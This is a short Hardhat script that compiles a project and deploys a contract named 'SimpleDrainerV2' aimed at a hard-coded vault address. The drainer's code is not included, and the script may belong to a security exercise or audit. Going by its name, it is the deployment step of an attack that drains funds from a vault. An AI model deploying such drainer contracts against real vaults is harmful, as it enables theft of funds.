const hre = require("hardhat");
const VAULT = "0x22650892Ce8db57fCDB48AE8b3508F52420A727A";

async function main() {
  const [deployer] = await hre.ethers.getSigners();
  console.log("Deployer:", deployer.address);
  
  // Compile the new contract
  await hre.run("compile");
  
  const Drainer = await hre.ethers.getContractFactory("SimpleDrainerV2");
  const drainer = await Drainer.deploy(VAULT);
  await drainer.waitForDeployment();
  
  console.log("SimpleDrainerV2 deployed:", await drainer.getAddress());
}

main().catch(console.error);
